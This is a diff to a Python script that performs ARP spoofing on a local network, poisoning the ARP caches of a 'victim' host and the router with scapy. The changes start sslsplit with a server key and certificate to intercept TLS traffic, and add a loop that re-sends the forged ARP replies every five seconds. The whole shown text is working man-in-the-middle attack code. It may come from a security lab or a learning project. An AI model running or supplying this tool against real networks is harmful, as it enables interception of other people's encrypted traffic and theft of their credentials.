@@ -3,6 +3,8 @@
 import netifaces as ni
 from math import log2
 from scapy.all import ARP, Ether, srp, send
+from subprocess import Popen, DEVNULL
+import time
 
 arp_table = {}
 hot_ip = None
@@ -66,11 +68,28 @@ def send_fake_arp():
 		send(arp_to_victim, verbose=False)
 		send(arp_to_router, verbose=False)
 
+def ssl_split():
+	Popen([
+		'sslsplit', '-D', '-S', 'sslsplit-log', '-p', 'sslsplit.pid',
+		'-k', 'server.key', '-c', 'server.crt', 'ssl', '0.0.0.0', '8888'
+	], stdout=DEVNULL, stderr=DEVNULL)
+	return	
 
 def main():
 	arp_scan()
 	send_fake_arp()
+	
+	ssl_split()
 
+	while True:
+		try:
+			send_fake_arp()
+			time.sleep(5)
+		except KeyboardInterrupt:
+			with open('sslsplit.pid') as f:
+				pid = next(f).strip()
+				Popen(['kill', pid])
+			break
 	return 
 
 
